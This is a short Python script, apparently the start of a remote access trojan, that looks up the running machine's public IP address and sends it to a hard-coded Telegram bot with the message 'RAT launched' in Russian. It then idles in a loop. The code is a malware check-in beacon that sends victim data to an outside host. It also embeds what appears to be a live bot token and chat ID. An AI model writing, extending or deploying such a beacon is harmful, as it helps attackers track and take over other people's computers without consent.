import requests
import time

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

def main():
    ip = requests.get("https://api.ipify.org").text
    send_tg(f"✅ RAT запущен!\nIP: {ip}")
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
